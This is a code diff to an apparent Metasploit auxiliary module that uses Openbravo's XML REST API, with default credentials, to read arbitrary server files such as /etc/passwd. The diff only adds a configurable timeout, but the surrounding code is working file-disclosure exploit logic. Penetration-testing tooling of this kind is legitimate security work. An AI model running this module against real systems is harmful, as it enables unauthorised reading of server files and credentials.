@@ -40,12 +40,17 @@ class Metasploit4 < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('TARGETURI', [ true, "Base Openbravo directory path", '/openbravo/']),
-        OptString.new('USERNAME', [true, "The Openbravo user", "Openbravo"]),
-        OptString.new('PASSWORD', [true, "The Openbravo password", "openbravo"]),
-        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"]),
-        OptString.new('ENDPOINT', [true, "The XML API REST endpoint to use", "ADUser"])
+        OptString.new('TARGETURI', [ true, "Base Openbravo directory path", '/openbravo/' ]),
+        OptString.new('USERNAME', [ true, "The Openbravo user", "Openbravo" ]),
+        OptString.new('PASSWORD', [ true, "The Openbravo password", "openbravo" ]),
+        OptString.new('FILEPATH', [ true, "The filepath to read on the server", "/etc/passwd" ]),
+        OptString.new('ENDPOINT', [ true, "The XML API REST endpoint to use", "ADUser" ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 60 ])
       ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 60
   end
 
   def run
@@ -54,7 +59,7 @@ class Metasploit4 < Msf::Auxiliary
       'method' => 'GET',
       'uri' => normalize_uri(datastore['TARGETURI'], "/ws/dal/#{datastore["ENDPOINT"]}"),
       'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
-    }, 60)
+    }, timeout)
 
     if !users or users.code != 200
       fail_with(Failure::NoAccess, "Invalid response. Check your credentials and that the server is correct.")
@@ -87,7 +92,7 @@ class Metasploit4 < Msf::Auxiliary
         'uri' => normalize_uri(target_uri.path, "/ws/dal/#{datastore["ENDPOINT"]}/#{id}"),
         'data' => xml,
         'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
-      })
+      }, timeout)
 
       if !resp or resp.code != 200 or resp.body =~ /Not updating entity/
         print_error("Problem updating #{datastore["ENDPOINT"]} #{other_id} with ID: #{id}")
@@ -100,7 +105,7 @@ class Metasploit4 < Msf::Auxiliary
         'method' => 'GET',
         'uri' => normalize_uri(datastore['TARGETURI'], "/ws/dal/#{datastore["ENDPOINT"]}/#{id}"),
         'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
-      })
+      }, timeout)
 
       u = REXML::Document.new u.body
       path = store_loot('openbravo.file','text/plain/', datastore['RHOST'], u.root.elements["//comments"].first.to_s, "File from Openbravo server #{datastore['RHOST']}")
@@ -117,7 +122,7 @@ class Metasploit4 < Msf::Auxiliary
         'uri' => normalize_uri(target_uri.path, "/ws/dal/#{datastore["ENDPOINT"]}/#{id}"),
       'data' => xml,
       'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
-      })
+      }, timeout)
 
       print_good("File saved to: #{path}")
     end
